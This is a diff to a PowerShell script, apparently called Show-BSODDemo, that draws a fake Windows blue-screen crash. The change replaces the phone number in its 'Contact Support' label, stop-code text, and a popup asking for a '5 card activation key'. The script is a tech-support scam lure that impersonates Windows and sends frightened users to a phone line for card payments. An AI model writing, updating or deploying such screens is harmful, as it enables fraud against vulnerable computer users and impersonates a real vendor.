@@ -60,7 +60,7 @@ PS> Show-BSODDemo
 	$form.Controls.Add($ipLabel)
 
 	$contactLabel = New-Object System.Windows.Forms.Label
-	$contactLabel.Text = "Contact Support: +18043199882"
+	$contactLabel.Text = "Contact Support: +18035697167"
 	$contactLabel.Font = New-Object System.Drawing.Font('Segoe UI Semibold', 24, [System.Drawing.FontStyle]::Regular)
 	$contactLabel.ForeColor = [System.Drawing.Color]::Red
 	$contactLabel.AutoSize = $true
@@ -111,7 +111,7 @@ PS> Show-BSODDemo
 	}
 
 	$qrText = New-Object System.Windows.Forms.Label
-	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +18043199882"
+	$qrText.Text = "For more information about this issue and possible fixes, visit`r`nhttps://www.windows.com/stopcode`r`n`r`nIf you call a support person, give them this info.`r`nStop code: DRIVER_PNP_WATCHDOG`r`nSupport: +18035697167"
 	$qrText.Font = New-Object System.Drawing.Font('Segoe UI Light', 13, [System.Drawing.FontStyle]::Regular)
 	$qrText.ForeColor = [System.Drawing.Color]::White
 	$qrText.AutoSize = $true
@@ -209,7 +209,7 @@ PS> Show-BSODDemo
 	$popup.Controls.Add($popupTitle)
 
 	$popupText = New-Object System.Windows.Forms.Label
-	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +18043199882"
+	$popupText.Text = "Enter the 5 card activation key`r`nCall support at +18035697167"
 	$popupText.Font = New-Object System.Drawing.Font('Segoe UI', 12)
 	$popupText.ForeColor = [System.Drawing.Color]::FromArgb(36, 36, 36)
 	$popupText.BackColor = $popup.BackColor
